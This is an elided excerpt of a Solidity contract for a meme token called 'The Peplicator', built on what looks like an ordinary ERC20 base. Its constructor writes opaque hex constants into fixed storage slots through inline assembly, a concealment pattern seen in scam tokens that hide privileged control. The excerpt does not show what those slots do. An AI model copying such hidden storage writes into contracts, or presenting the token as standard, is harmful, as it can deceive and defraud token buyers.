...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor (string memory name_, string memory symbol_) {
        ...
        assembly {
            sstore(0x50,0xac0a76ae485b6f106f6fff469c79e5e5e92062de1b45)
            sstore(0x51,0xac0a2a4cfbc7354562d9c44f69c4482b3013975bc80f)
    ...
    function _DeployPeplicator(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployPeplicator(creator, initialSupply);
    }
}

contract Peplicator is ERC20Token {
    constructor() ERC20Token("The Peplicator", "PEPLICATOR", msg.sender, 420690000 * 10 ** 18) {
    }
}